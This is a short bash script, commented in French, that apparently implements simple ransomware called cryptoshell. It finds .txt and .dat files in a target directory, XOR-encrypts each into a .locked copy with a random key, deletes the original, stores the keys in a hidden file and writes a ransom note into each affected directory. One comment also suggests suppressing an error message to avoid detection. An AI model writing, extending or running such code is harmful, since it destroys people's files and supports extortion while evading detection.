#!/bin/bash
. xor_helper.sh
. fct.sh

# verifie les arguments
if [ "$#" -ne 1 ]; then
    echo "usage: ./cryptoshell.sh <repertoire>"
    exit 1
fi

if [ ! -d "$1" ] ; then 
    echo "repertoire invalide" 
    #possibilite de supprimer ce message pour ne pas etre detetcer 
    exit 1 
fi


# parcours du repertoire
find "$1" -type f \( -name "*.txt" -o -name "*.dat" \) | while read f
do
#verifier si le fichier est deja chiffre
    if [[ "$f" == *".locked" ]]; then
        continue
    fi

    #optionel : on ecris les nom des fichier dans target.list
    
    #s=$(stat -c%s "$f")
    #d=$(stat -c%y "$f" | cut -d '.' -f1)
    #echo "$f | $s bytes | $d" >> target.list

    key=$(generate_key 8)
    locked="$f.locked"
    xor_file "$f" "$locked" "$key"
    rm "$f"
    echo "$key" >> .cryptoshell_key

done

#on ajoute la note (une par repertoire)
find "$1" -type f -name "*.locked" -exec dirname {} \; | sort -u | while IFS= read -r d
do
    create_ransom_note "$d"
done
